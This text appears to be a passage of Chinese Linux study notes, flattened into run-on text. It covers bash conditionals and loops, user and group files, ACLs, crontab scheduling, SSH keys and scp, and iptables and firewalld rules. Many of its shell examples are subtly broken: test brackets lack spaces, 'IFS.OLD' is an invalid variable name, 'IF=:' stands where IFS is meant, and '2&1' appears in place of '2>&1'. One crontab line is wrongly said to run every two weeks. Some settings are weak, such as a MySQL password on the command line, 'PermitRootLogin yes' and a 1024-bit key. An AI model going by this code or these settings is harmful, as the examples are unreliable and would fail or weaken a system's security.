2 &gt; 90))then        (( $var2 = $var1 ** 2))        echo "The square of $var1 is $var2."fi  #!/bin/bash  # [[ expression ]]  if[[ $USER == r* ]]  then          echo "Hello $USER"else        echo "Sorry, I do not know you."  ficase 命令格式：case $变量名 in模式1)命令序列1;;模式2)命令序列2;;*)默认执行的命令序列;;esac   #!/bin/bash  case $action in        start | begin)                echo "start something"                echo "begin something";;        stop | end)                echo "stop something"                echo "end something";;        *)        echo "Ignorant.";;esacfor 命令格式：for var in listdocommandsdone#!/bin/bash## basic for commandfor country in China America India Japendo        echo "The next state is $country"done# another example of how not to use the for command# 1.&#20351;&#29992;&#36716;&#20041;&#23383;&#31526;&#65288;&#21453;&#26012;&#32447;&#65289;# 2.&#20351;&#29992;&#21452;&#24341;&#21495;for test in I don\'t know if "this'll" workdo        echo "word:$test"done# using a variable to hold the listlist="China America India Japen"list=$list" Connecticut"for country in $listdo        echo "Welcome to $country"done# reading values from a filefile="states"# &#20462;&#25913;IFS&#29615;&#22659;&#21464;&#37327;&#30340;&#20540;&#65292;&#20351;&#20854;&#21482;&#33021;&#35782;&#21035;&#25442;&#34892;&#31526;IFS=$'\n'for state in $(cat $file)do        echo "Visit beautiful $state"done# iterate through all the files in a directoryfor file in $HOME/* /etc/nginx/*do        if [-d "$file"]        then                echo "$file is a directory."        elif [-f "$file"]        then                echo "$file is a file."        fidone# C-style for loop#for (( i=1; i &lt;= 10; i++))do        echo "The next number is $i"done# multiple variablefor (( a=1; b=10;a &lt;= 10; a++, b++))do        echo "$a - $b"donewhile 命令格式：while test commanddoother commandsdone# while command testvar1=10while [ $var1 -gt 0 ]do        echo $var1        var1=$[ $var1 - 1 ]doneuntil 命令until 命令和 while 命令完全相反。格式：until test commanddoother commandsdone1: #!/bin/bash2: # using the until command3: var1=1004: until [ $var1 -eq 0 ]5: do6:         echo $var17:         var1=$[ $var1 -25 ]8: done应用循环处理文件数据 1: #!/bin/bash 2: # changing the IFS value 3: IFS.OLD=$IFS 4: IFS=$'\n' 5: for entry in $(cat /etc/passwd) 6: do 7:         echo "Values in $entry -" 8:         IFS=: 9:         for value in $entry10:         do11:                 echo "$value"12:         done13: done14: # &#35813;&#33050;&#26412;&#20351;&#29992;&#20102;&#20004;&#20010;&#19981;&#21516;&#30340; IFS &#30340;&#20540;&#26469;&#35299;&#26512;&#25968;&#25454;&#65292;&#31532;&#19968;&#20010; IFS &#20540;&#35299;&#26512;&#20986; /etc/passwd &#25991;&#20214;&#20013;&#30340;&#21333;&#29420;&#30340;&#34892;&#65292;&#20869;&#37096; for &#24490;&#29615;&#25509;&#30528;&#23558; IFS &#30340;&#20540;&#20462;&#25913;&#20026;&#20882;&#21495;&#65292;&#20801;&#35768;&#20320;&#20174; /etc/passwd &#30340;&#34892;&#20013;&#35299;&#26512;&#20986;&#21333;&#29420;&#30340;&#20540;&#12290;break 命令 1: #!/bin/bash 2: # -------------------------------- 3: # &#36339;&#20986;&#21333;&#20010;&#24490;&#29615; 4: # 1.breaking out of a for loop 5: for var1 in 1 2 3 4 5 6: do 7:         if [ $var1 -eq 5] 8:         then 9:                 break10:         fi11:         echo "Iteration number: $var1"12: done13: echo "The for loop is completed"14: # 2.breaking out of a while loop15: var1=116: while [ $var1 -lt 10 ]17: do18:         if [ $var1 -eq 5]19:         then20:                 break21:         fi22:         echo "Iteration number: $var1"23: done24: echo "The while loop is completed"25: # --------------------------------26: # &#36339;&#20986;&#20869;&#37096;&#24490;&#29615;27: # 3.breaking out of an inner loop28: for(( a = 1; a&lt;4; a++))29: do30:         echo "Outer loop: $a"31:         for((b = 1; b&lt;100; b++))32:         do33:                 if [ $var1 -eq 5]34:                 then35:                         break36:                 fi37:                 echo "Inner loop: $b"38:         done39: done40: # ---------------------------------41: # &#36339;&#20986;&#22806;&#37096;&#24490;&#29615;42: # 4.breaking out of an outer loop43: for(( a = 1; a&lt;4; a++))44: do45:         echo "Outer loop: $a"46:         for((b = 1; b&lt;100; b++))47:         do48:                 if [ $var1 -eq 5]49:                 then50:                         break 251:                 fi52:                 echo "Inner loop: $b"53:         done54: donecontinue 命令 1: # 1.using the continue command 2: for((var1 = 1; var1&lt;15; var1++)) 3: do 4:         if [$var1 -gt 5] &amp;&amp; [$var1 -lt 10] 5:         then 6:                 continue 7:         fi 8:         echo "Iteration number: $var1" 9: done10: # 2.improperly using the continue command in a while loop11: var1=112: while echo "while iteration: $var1"13:         [ $var1 -lt 15 ]14: do15:         if [ $var1 -gt 5] &amp;&amp; [$var1 -lt 10]16:         then17:                 continue18:         fi19:         echo "Inside iteration number: $var1"20:         var1 = $[$var1 +1]21: done22: # 3.continuing an outer loop23: for(( a = 1; a&lt;5; a++))24: do25:         echo "Interation : $a"26:         for((b = 1; b&lt;3; b++))27:         do28:                 if [ $b -gt 2] &amp;&amp; [$a -lt 4]29:                 then30:                         continue 231:                 fi32:                 var3=$[$a+$b]33:                 echo "The result of $a * $b is $var3"34:         done35: done处理循环的输出可以对循环的输出使用管道或进行重定向，通过在 done 命令之后添加一个处理命令来实现：for file in /home/zrg/*do...done &gt; output.txt实例#!/bin/bash# finding files in the PATHIF=:for folder in $PATHdo        echo "$folder:"        for file in $folder/*        do                if [-x $file]                then                        echo "$file"                fi        donedone#!/bin/bash# process new user accountsinput = "users.csv"while IFS=',' read -r userid namedo        echo "adding $userid"        useradd -c "$name" -m $useriddone &lt; "$input"4.4.3 输入输出命令行参数位置参数(positional parameter)变量是标准的数字：$0是程序名，$1是第一个参数，$2是第二个参数，依次类推，直到第九个参数$9#!/bin/bash# using one command line parameter#factorial=1for ((number=1; number&lt;=$1; number++))do        factorial=$[$factorial * $number]doneecho "The factorial of $1 is $factorial"4.4.4 控制脚本4.5 高级 shell 脚本编程4.5.1 创建函数4.5.2 图形化桌面环境中的脚本编程4.5.3 初识 sed 和 gawk4.5.4 正则表达式4.5.5 sed 和 gawk 进阶4.5.6 使用其他 shell4.6 创建实用的脚本4.6.1 编写简单的脚本实用工具归档管理用户账户检测磁盘空间4.6.2 创建与数据库、Web及E-Mail相关的脚本4.6.3 一些小意思的脚本发送消息获取格言编造借口在当前目录及指定子目录深度下创建.gitignore文件#!/bin/shfor dir in `find ./ -mindepth 2 -maxdepth 4 -type d`do        echo $dir        `touch $dir/.gitignore`        echo "*"&gt;$dir/.gitignoredone解决 dpkg: warning: files list file for package 'x' missingListing 1: for package in $(sudo apt install catdoc 2&amp;1 |grep "warning: files list file for package'" |grep -Po "[^'\n ]+'" |grep -Po "[^']+");do        sudo apt install --reinstall "$package"done5 Linux 进阶篇(Advanced)5.1 Linux 帐号管理与 ACL 权限控制5.1.1 Linux 账户/etc/passwd$ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin...zrg:x:1000:1000:zrg,,,:/home/zrg:/bin/bash/etc/passwd 文件的字段包含如下信息：登录用户名用户密码UIDGroup ID描述HOME目录位置默认shell/etc/passwd 文件中的密码字段都被设置成了x，多数Linux系统都将用户密码保存在/etc/shadow文件中，只有特定的程序（比如登录程序）才能访问这个文件。一般情况下，不建议直接手动在/etc/passwd文件里进行用户管理（比如添加、修改或删除用户账户）。用标准的Linux用户管理工具去执行这些操作就会安全许多。/etc/shadow/etc/shadow 文件的每条记录都有9个字段：与/etc/passwd文件对应的登录名加密后的密码自上次修改密码后过去的天数密码（自1970年1月1日开始计算）多少天后才能更改密码多少天后必须更改密码密码过期前提前多少天提醒用户更改密码密码过期后多少天禁用用户帐目用户账户被禁用的日期（用自1970年1月1日到当天的天数表示）预留字段给将来使用用户管理文件Home 目录超级用户：/root/普通用户：/home/zrg/var/spool/mail/zrg用户邮箱目录/etc/skel在创建用户时，默认复制该目录下的文件到用户的家目录。新增、删除和修改用户//新增用户$ sudo useradd -Dor$ sudo less /etc/default/useraddSee below, the subsection "Changing the default values".GROUP=100 //用户默认组，新用户被添加到GID为100的公共组HOME=/home //HOME目录位置INACTIVE=-1 //密码过期宽限天数，密码过期后不会被禁用EXPIRE= //密码失效时间，未被设置过期日期，密码失效与 /etc/login.defs 默认文件相关。SHELL=/bin/sh //将sh作为默认shellSKEL=/etc/skel //模板目录，会将/etc/skel目录下的内容复制到用户的HOME目录下CREATE_MAIL_SPOOL=no //是否为该用户账户在mail目录下创建一个用于接收邮件的文件//用上面的默认系统参数创建一个新用户账户$ sudo useradd test//要想在创建用户时改变默认值或默认行为，可以使用命令参数，比如:$ sudo useradd -u 666 -G root,bin -c "test user" -d /home/test -s /bin/bash test//删除用户默认情况下，userdel命令只会删除/etc/passwd文件中的用户信息，而不会删除系统中属于该账户的任何文件。$ userdel -r test加上-r参数，userdel会删除用户的HOME目录以及邮件目录，但必须在删除之前检查清楚（比如是否存放了其他用户或其他程序要使用的重要文件）//修改用户Table 13: 用户账户修改工具命令描述usermod修改用户账户的字段，指定主要组以及附加组的所属关系passwd修改已有用户的密码chpasswd从文件中读取登录名密码对，并更新密码chage修改密码的过期时间chfn修改用户账户的备注信息chsh修改用户账户的默认登录shell修改密码修改用户密码的命令：passwd-S 查询用户密码的状态，仅root用户可用。-l 暂时锁定用户。仅root用户可用。-u 解锁用户。仅root用户可用。&#x2013;stdin 通过管道符输出的数据作为用户的密码。5.1.2 Linux 群组/etc/group/etc/group文件有4个字段：组名组密码GID属于该组的用户列表，当一个用户在/etc/passwd文件中指定某个组作为默认组时，用户账户不会作为该组成员再出现在/etc/group文件中。/etc/gshadow/etc/group的加密资讯文件，比如用户组（Group）管理密码就是存放在这个文件。/etc/gshadow和/etc/group是互补的两个文件；对于大型服务器，针对很多用户和组，定制一些关系结构比较复杂的权限模型，设置用户组密码是极有必要的。比如我们不想让一些非用户组成员永久拥有用户组的权限和特性，这时我们可以通过密码验证的方式来让某些用户临时拥有一些用户组特性，这时就要用到用户组密码。$ sudo less /etc/gshadow组名：用户组的名称，由字母或数字构成。口令：用户组密码，这个段可以是空的或!，如果是空的或有!，表示没有密码。组管理者：这个字段也可为空，如果有多个用户组管理者，用,号分割。组内用户列表：如果有多个成员，用,号分割 ;创建、修改和删除组$ sudo groupadd shared$ sudo groupmod -n sharing shared$ sudo groupdel shared加入组和从组里删除$ sudo gpasswd -a test tests$ sudo gpasswd -d test tests5.1.3 Linux 细部权限规划：ACL 的使用什么是 ACL？ACL 是 Access Control List 的缩写，主要的目的是在提供传统的 owner,group,others 的 read,write,execute 权限之外的细部权限配置。ACL 主要可以针对哪些方面来控制权限呢？它主要可以针对几个项目：使用者 (user)：可以针对使用者来配置权限；群组 (group)：针对群组为对象来配置其权限；默认属性 (mask)：还可以针对在该目录下在创建新文件/目录时，规范新数据的默认权限；如何开启 ACL？// 查看分区 ACL 权限是否开启。$ sudo dumpe2fs -h /dev/sdb1// 找到"Default mount options"，查看是否有// 临时开启分区 ACL 权限$ sudo mount -o remount,acl /// 重新挂载跟分区，并挂载加入 acl 权限。// 永久开启分区 ACL 权限$ sudo vim /etc/fstabUUID=e50dea0a-bcb6-4921-8762-dd96782846dd / ext4 defaults,acl 0 1     // 加入acl。注意：目前多数 Linux 系统 defaults 默认已经支持 acl 开启了，所以只需要添加 defaults 选项就可以了。$ sudo mount -o remount /// 重新挂载文件系统或重启系统，使修改生效。设定 ACL 权限setfacl 命令选项与参数：-m ：配置后续的 acl 参数给文件使用，不可与 -x 合用；-x ：删除后续的 acl 参数，不可与 -m 合用；-b ：移除所有的 ACL 配置参数；-k ：移除默认的 ACL 参数，关于所谓的『默认』参数于后续范例中介绍；-R ：递归配置 acl ，亦即包括次目录都会被配置起来；-d ：配置『默认 acl 参数』的意思！只对目录有效，在该目录新建的数据会引用此默认值示例：构建听课权限组，为特定用户设定 ACL 权限# useradd wang# useradd li# useradd zhao# groupadd coursegroup# mkdir /project# chown root:coursegroup /project/# chmod 770 /project# setfacl -m u:zhao:rwx /project// setfacl格式：u:使用者:权限getfacl 命令选项与参数：getfacl 的选项几乎与 setfacl 相同！格式: getfacl filename针对有效权限 (effective permission)mask 的设定有效权限：使用者或群组所配置的权限必须要存在于 mask 的权限配置范围内才会生效。配置规范：『 m:[rwx] 』，例如针对某个文件规范为仅有 rx ：# setfacl -m m:rx /project/testfile针对默认权限的设定配置规范：『 d:[ug]:使用者列表:[rwx] 』# setfacl -m d:u:zhao:rx /project5.2 例行性工作排程5.2.1 对于 Linux 用户你肯定希望：     每一天早上 8:00 钟，让电脑连接上音响，并播放音乐来唤你起床；     而中午 12:00 希望 Linux 可以发一封信到你的邮件信箱，提醒你可以去吃午餐了；     另外，在每年你爱人生日的前一天，先发封信提醒你，以免忘记这么重要的一天。5.2.2 crontab 简单介绍crontab 命令的功能是在一定的时间间隔调度一些命令的执行。/etc/crontab 文件在 /etc 目录下有一个 crontab 文件，这里存放有系统运行的一些调度程序。每个用户可以建立自己的调度 crontab(在 /var/spool/cron 目录下)。cron 服务每分钟不仅要读一次 /var/spool/cron 内的所有文件，还需要读一次 /etc/crontab，因此我们配置这个文件也能运用 cron 服务做一些事情。用 crontab 配置是针对某个用户的，而编辑 /etc/crontab 是针对系统的任务。crontab 文件格式如下：SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root       #&#22914;&#26524;&#20986;&#29616;&#38169;&#35823;&#65292;&#25110;&#32773;&#26377;&#25968;&#25454;&#36755;&#20986;&#65292;&#25968;&#25454;&#20316;&#20026;&#37038;&#20214;&#21457;&#32473;&#36825;&#20010;&#24080;&#21495;HOME=/            #&#20351;&#29992;&#32773;&#36816;&#34892;&#30340;&#36335;&#24452;,&#36825;&#37324;&#26159;&#26681;&#30446;&#24405;# run-parts注意到"run-parts"这个参数，后面可以写要运行的某个脚本。另外：/usr/lib/cron/cron.allow 表示谁能使用 crontab 命令。如果它是一个空文件表明没有一个用户能安排作业。如果这个文件不存在，而有另外一个文件。/usr/lib/cron/cron.deny,则只有不包括在这个文件中的用户才可以使用 crontab 命令。如果它是一个空文件表明任何用户都可安排作业。两个文件同时存在时，cron.allow 优先，如果都不存在，只有超级用户可以安排作业。5.2.3 crontab 基本格式Table 14: 格式\*****commond代表意思分时日月周&#xa0;范    围(0-59)(0-23)(1-31)(1-12)(0-6)&#xa0;“ * ”表示任意时刻“ , ”表示分割“ - ”表示一个段“ /n ”表示每 n 的单位执行一次命令后面加上 &gt;/dev/null 2&gt;&amp;1  ,标准错误重定向到标准输出5.2.4 实例1：实现两个周备份一次 /var/ftp 目录下的内容具体实现方法如下:   a.先新建一个 txt 文件，这里是 ftp-back-shell.txt，文件内容：* * 14 * * cd /back/ftp-back/ &amp;&amp; rsync -avzc /var/ftp ./b.将 ftp-back.txt 文件放到 /opt/ftp-back/ 目录下 c.运行：     $ crontab /opt/ftp-back/ftp-back.txt     $ crontab -ld.需要进行重启，配置文件生效： sudo systemctl restart crond.service5.2.5 实例2：实现定时插入数据新建 crontab.sh 脚本文件$ vim crontab.sh#!/bin/sh/usr/bin/php /home/zrg/.crontab/crontab.php编辑 php 文件设置定时任务$ crontab -e*/2 * * * * /bin/bash /home/zrg/.crontab/crontab.sh查看定时任务$ crontab -l重启服务使生效：sudo systemctl restart cron.service移除定时服务$ crontab -r5.2.6 示例3：备份 mysql 数据$ sudo vim cron.sh#!/bin/shfilename=`date +%Y%m%d%H%M%S`mysqldump -u root -proot testdb&gt;/home/zrg/crontab/$filename.sql$ crontab -e0 2 * * *  /bin/bash /home/zrg/crontab/cron.sh$rccron reload5.2.7 一些简单示例43 21 * * * 21:43 执行0 17 * * 1 每周一的 17:00 执行0,10 17 * * 0,2,3 每周日,周二,周三的 17:00和 17:10 执行0-10 17 1 * * 毎月1日从 17:00到17:10 毎隔1分钟 执行*/10 * * * * 　　　　　　 每隔10分 执行0,10,20,30,40,50 * * * *　每隔10分 执行2 8-20/3 * * *　　　　　　8:02,11:02,14:02,17:02,20:02 执行5.3 软件安装5.3.1 sshSSH &amp; OpenSSH &amp; SSL &amp; OpenSSLSSL(Secure Sockets Layer)，是网络通信提供安全及数据完整性的一种安全协议，它涉及所有TC/IP应用程序。SSL协议使用通讯双方的客户证书以及CA根证书，允许客户/服务器应用以一种不能被偷听的方式通讯，在通讯双方间建立起了一条安全的、可信任的通讯通道。它具备以下基本特征：信息保密性、信息完整性、相互鉴定。 主要用于提高应用程序之间数据的安全系数。OpenSSL，对SSL的实现。SSH(Secure Shell)，意为“安全外壳协议”，是一种可以为远程登录提供安全保障的协议。使用SSH，可以把所有传输的数据进行加密，“中间人”攻击方式就不可能实现，能防止DNS欺骗和IP欺骗。OpenSSH，对SSH的实现。依赖于OpenSSL，没有OpenSSL的话OpenSSH就编译不过去，也运行不了。HTTPS(Hypertext Transfer Protocol Secure，超文本传输安全协议)，是一种透过计算器网上进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。ssh 配置配置持久连接服务端$ sudo vim /etc/ssh/sshd_config#server&#27599;&#38548;60&#31186;&#21457;&#36865;&#19968;&#27425;&#35831;&#27714;&#32473;client&#65292;&#28982;&#21518;client&#21709;&#24212;&#65292;&#20174;&#32780;&#20445;&#25345;&#36830;&#25509;ClientAliveInterval 60  #server&#21457;&#20986;&#35831;&#27714;&#21518;&#65292;&#23458;&#25143;&#31471;&#27809;&#26377;&#21709;&#24212;&#24471;&#27425;&#25968;&#36798;&#21040;3&#65292;&#23601;&#33258;&#21160;&#26029;&#24320;&#36830;&#25509;&#65292;&#27491;&#24120;&#24773;&#20917;&#19979;&#65292;client&#19981;&#20250;&#19981;&#21709;&#24212;&#12290;ClientAliveCountMax 3客户端$ sudo vim /etc/ssh/ssh_config#server&#27599;&#38548;60&#31186;&#21457;&#36865;&#19968;&#27425;&#35831;&#27714;&#32473;client&#65292;&#28982;&#21518;client&#21709;&#24212;&#65292;&#20174;&#32780;&#20445;&#25345;&#36830;&#25509;ServerAliveInterval 60  #server&#21457;&#20986;&#35831;&#27714;&#21518;&#65292;&#23458;&#25143;&#31471;&#27809;&#26377;&#21709;&#24212;&#24471;&#27425;&#25968;&#36798;&#21040;3&#65292;&#23601;&#33258;&#21160;&#26029;&#24320;&#36830;&#25509;&#65292;&#27491;&#24120;&#24773;&#20917;&#19979;&#65292;client&#19981;&#20250;&#19981;&#21709;&#24212;&#12290;ServerAliveCountMax 3使用OpenSSL生成密钥对生成私钥$ openssl genrsa -out rsa_private_key.pem 1024参数:genrsa 生成密钥   -out 输出到文件  rsa_private_key.pem 文件名  1024 长度从私钥中提取公钥$ openssl rsa -in rsa_private_key.pem -pubout -out rsa_public_key.pem参数: rsa 提取公钥  -in 从文件中读入  rsa_private_key.pem 文件名   -pubout  输出   -out 到文件  rsa_public_key.pem  文件名修改ssh默认端口号首先修改配置文件：$ vim /etc/ssh/sshd_configPort 22 Port 6666   注意：这里添加6666端口，测试成功连接后，再去除22端口配置。这样可以避免修改不成功无法正常登录。所修改的端口需要事先查明未被其他服务占用，以免造成不可估计的后果！重启ssh和防火墙$ systemctl restart iptables$ systemctl restart sshd假如要限制SSH登陆的IP，那么可以如下做：首先：修改/etc/hosts.deny，在其中加入sshd:ALL然后：修改：/etc/hosts.allow，在其中进行如下设置：sshd:192.168.1.1：deny  （192.168.1.*）这样就可以限制只有192.168.1.1的IP通过SSH登陆上LINUX机器了。通过密钥登录服务器生成密钥对$ ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/home/zrg/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /home/zrg/.ssh/id_rsa.Your public key has been saved in /home/zrg/.ssh/id_rsa.pub.The key fingerprint is:SHA256:OEEJVicOORWU5awcPz7oYPtldQwQXdwuPFyUcVY0umU zrg@DESKTOP-5IIDIKQThe key's randomart image is:+---[RSA 2048]----+|    +*B==o o.oo=*||   .o+o= .. . =o.||     .+ o .o + E ||     . *   o= =  ||      = S . o+   ||       + o .     ||    o . =        ||   . + o .       ||    ..o          |+----[SHA256]-----+在服务器上配置上公钥$ cat ~/.ssh/id_rsa.pub &gt;&gt; authorized_keys$ chmod 600 ~/.ssh/authorized_keys$ chmod 700 ~/.ssh配置ssh，打开密钥登录功能$ vim /etc/ssh/sshd_configRSAAuthentication yesPubkeyAuthentication yesPermitRootLogin yes //root &#29992;&#25143;&#33021;&#21542;&#36890;&#36807; SSH &#30331;&#24405;PasswordAuthentication no //&#24403;&#23436;&#25104;&#20840;&#37096;&#35774;&#32622;&#65292;&#20197;&#23494;&#38053;&#26041;&#24335;&#30331;&#24405;&#25104;&#21151;&#21518;&#65292;&#21487;&#20197;&#31105;&#29992;&#23494;&#30721;&#30331;&#24405;&#65306;重启ssh服务$ systemctl restart sshd.service使用scp上传或下载文件从服务器上下载文件$ scp username@servername:/path/filename /var/www/local_dir（本地目录）示例：scp root@192.168.0.101:/var/www/test.txt  把 192.168.0.101 上的 /var/www/test.txt 的文件下载到 /var/www/local_dir（本地目录）上传本地文件到服务器$ scp /path/filename username@servername:/path   例如 scp /var/www/test.php  root@192.168.0.101:/var/www/  把本机 /var/www/ 目录下的 test.php 文件上传到 192.168.0.101 这台服务器上的 /var/www/ 目录中从服务器下载整个目录$ scp -r username@servername:/var/www/remote_dir/（远程目录） /var/www/local_dir（本地目录）例如：scp -r root@192.168.0.101:/var/www/test  /var/www/  上传目录到服务器$ scp  -r local_dir username@servername:remote_dir例如：scp -r test  root@192.168.0.101:/var/www/ 把当前目录下的test目录上传到服务器的 /var/www/ 目录5.3.2 在服务器上启用HTTPS创建一个 2048 位 RSA 公钥/私钥对。生成一个嵌入您的公钥的证书签名请求 (CSR)将 CSR 与证书颁发机构 (CA) 共享以接收最终证书或证书链。将最终证书安装在非网络可访问的位置，例如 /etc/ssl（Linux 和 Unix）或 IIS 需要它的位置 (Windows)。1. 生成密钥和证书签名请求此部分使用 openssl 命令行程序（大部分 Linux、BSD 和 Mac OS X 系统均附带此程序）来生成私钥/公钥和 CSR。参考资料：在服务器上启用 HTTPS5.3.3 iptables &amp; firewalld防火墙管理工具众所周知，企业内网和外部公网相比，外部的公网环境更加恶劣，罪恶丛生。在公网与企业内网之间充当保护屏障的防火墙（见下图所示）虽然有软件或硬件之分，但主要功能都是依据策略对穿越防火墙自身的流量进行过滤。防火墙策略可以基于流量的源地址、端口号、协议、应用等信息来定制，然后防火墙使用预先定制的策略规则监控出入的流量，若流量与某一条策略规则相匹配，则执行相应的处理，反之则丢弃。这样一来，就可以保证仅有合法的流量在企业内网和外部公网之间流动了。目前在RHEL 7系统中，firewalld防火墙取代了iptables防火墙。其实，iptables与firewalld都不是真正的防火墙，它们都只是用来定义防火墙策略的防火墙管理工具而已，或者说，它们只是一种服务。与 Linux 内核集成的 IP 信息包过滤系统。防火墙在做数据包过滤决定时，有一套遵循和组成的规则，这些规则存储在专用的数据包过滤表中，而这些表集成在 Linux 内核中。iptables服务会把配置好的防火墙策略交由内核层面的netfilter网络过滤器来处理，而firewalld服务则是把配置好的防火墙策略交由内核层面的nftables包过滤框架来处理。换句话说，当前在Linux系统中其实存在多个防火墙管理工具，旨在方便运维人员管理Linux系统中的防火墙策略，我们只需要配置妥当其中的一个就足够了。虽然这些工具各有优劣，但它们在防火墙策略的配置思路上是保持一致的。netfilter 组件也称为内核空间（kernelspace），是内核的一部分，由一些信息包过滤表组成，这些表包含内核用来控制信息包过滤处理的规则集。iptables 组件是一种工具，也称为用户空间（userspace），它使插入、修改和除去信息包过滤表中的规则变得容易。iptables在早期的Linux系统中，默认使用的是iptables防火墙管理服务来配置防火墙。尽管新型的firewalld防火墙管理服务已经被投入使用多年，但是大量的企业在生产环境中依然出于各种原因而继续使用iptables。策略与规则链防火墙会从上至下的顺序来读取配置的策略规则，在找到匹配项后就立即结束匹配工作并去执行匹配项中定义的行为（即放行或阻止）。如果在读取完所有的策略规则之后没有匹配项，就去执行默认的策略。防火墙策略规则的设置有两种：一种是“通”（即放行），一种是“堵”（即阻止iptables服务把用于处理或过滤流量的策略条目称之为规则，多条规则可以组成一个规则链，而规则链则依据数据包处理位置的不同进行分类，具体如下：在进行路由选择前处理数据包（PREROUTING）；处理流入的数据包（INPUT）；处理流出的数据包（OUTPUT）；处理转发的数据包（FORWARD）；在进行路由选择后处理数据包（POSTROUTING）。一般来说，从内网向外网发送的流量一般都是可控且良性的，因此我们使用最多的就是INPUT规则链，该规则链可以增大黑客人员从外网入侵内网的难度。iptables 服务的术语:ACCEPT（允许流量通过）、REJECT（拒绝流量通过，拒绝流量后再回复一条"您的信息已经收到，但是被扔掉了"）、LOG（记录日志信息）、DROP（拒绝流量通过，直接将流量丢弃不响应）。当把Linux系统中的防火墙策略设置为REJECT拒绝动作后，流量发送方会看到端口不可达的响应：把Linux系统中的防火墙策略修改成DROP拒绝动作后，流量发送方会看到响应超时的提醒。但是流量发送方无法判断流量是被拒绝，还是接收方主机当前不在线基本的命令参数规则功能说明1. Table 15: 表filter主要和主机自身有关，主要负责防火墙功能 过滤本机流入流出的数据包是默认使用的表input负责过滤所有目标地址是本机地址的数据包，就是过滤进入主机的数据包forward负责转发流经主机但不进入本机的数据包，和NAT关系很大output负责处理源地址的数据包，就是对本机发出的数据包;2. NAT 表，负责网络地址转换，即来源于目的IP地址和端口的转换，一般用于共享上网或特殊端口的转换服务Table 16: NATsnat地址转换dnat标地址转换pnat标端口转换3. mangle 表将报文拆开来并修改报文标志位，最后封装起来4. 5个检查点（内置链）PREROUTINGINPUTFORWORDOUTPUTPOSTROUTINGiptables中常用的参数以及作用Table 17: iptables中常用的参数以及作用参数作用-P设置默认策略-F清空规则链-L查看规则链-A在规则链的末尾加入新规则-I num在规则链的头部加入新规则-D num删除某一条规则-s匹配来源地址IP/MASK，加叹号“!”表示除这个IP外-d匹配目标地址-i 网卡名称匹配从这块网卡流入的数据-o 网卡名称匹配从这块网卡流出的数据-p匹配协议，如TCP、UDP、ICMP&#x2013;dport num匹配目标端口号&#x2013;sport num匹配来源端口号查看已有的防火墙规则链$ iptables -L$ iptables -nvL –line-number-L 查看当前表的所有规则，默认查看的是filter表，如果要查看NAT表，可以加上-t NAT参数-n 不对ip地址进行反查，加上这个参数显示速度会快很多-v 输出详细信息，包含通过该规则的数据包数量，总字节数及相应的网络接口–line-number 显示规则的序列号，这个参数在删除或修改规则时会用到清空已有的防火墙规则链$ iptables -F添加规则把INPUT规则链的默认策略设置为拒绝$ iptables -P INPUT DROP规则链的默认策略拒绝动作只能是DROP，而不能是REJECT。向INPUT链中添加允许ICMP流量进入的策略规则$ iptables -I INPUT -p icmp -j ACCEPT在日常运维工作中，经常会使用ping命令来检查对方主机是否在线，而向防火墙的INPUT规则链中添加一条允许ICMP流量进入的策略规则就默认允许了这种ping命令检测行为。删除INPUT规则链中刚刚加入的那条策略（允许ICMP流量），并把默认策略设置为允许$ iptables -D INPUT 1$ iptables -P INPUT ACCEPT将INPUT规则链设置为只允许指定网段的主机访问本机的22端口，拒绝来自其他所有主机的流量$ iptables -I INPUT -s 192.168.10.0/24 -p tcp --dport 22 -j ACCEPT$ iptables -A INPUT -p tcp --dport 22 -j REJECT向INPUT规则链中添加拒绝所有人访问本机12345端口的策略规则$ iptables -I INPUT -p tcp --dport 12345 -j REJECT$ iptables -I INPUT -p udp --dport 12345 -j REJECT向INPUT规则链中添加拒绝192.168.10.5主机访问本机80端口（Web服务）的策略规则$ iptables -I INPUT -p tcp -s 192.168.10.5 --dport 80 -j REJECT向INPUT规则链中添加拒绝所有主机访问本机1000～1024端口的策略规则$ iptables -A INPUT -p tcp --dport 1000:1024 -j REJECT$ iptables -A INPUT -p udp --dport 1000:1024 -j REJECT保存防火墙策略命令，使其永久生效$ service iptables saveFirewalldFirewalld(Dynamic Firewall Manager of Linux systems, Linux系统的动态防火墙管理器)，服务是默认的防火墙配置管理工具，它拥有基于CLI（命令行界面）和基于GUI（图形用户界面）的两种管理方式。相较于传统的防火墙管理配置工具，firewalld支持动态更新技术并加入了区域（zone）的概念。简单来说，区域就是firewalld预先准备了几套防火墙策略集合（策略模板），用户可以根据生产场景的不同而选择合适的策略集合，从而实现防火墙策略之间的快速切换。firewalld中常见的区域名称（默认为public）以及相应的策略规则如下表所示。Table 18: firewalld中常用的区域名称及策略规则区域默认规则策略trusted允许所有的数据包home拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、mdns、ipp-client、amba-client与dhcpv6-client服务相关，则允许流量internal等同于home区域work拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、ipp-client与dhcpv6-client服务相关，则允许流量public拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh、dhcpv6-client服务相关，则允许流量external拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量dmz拒绝流入的流量，除非与流出的流量相关；而如果流量与ssh服务相关，则允许流量block拒绝流入的流量，除非与流出的流量相关drop拒绝流入的流量，除非与流出的流量相关终端管理工具firewall-cmd是firewalld防火墙配置管理工具的CLI（命令行界面）版本Table 19: 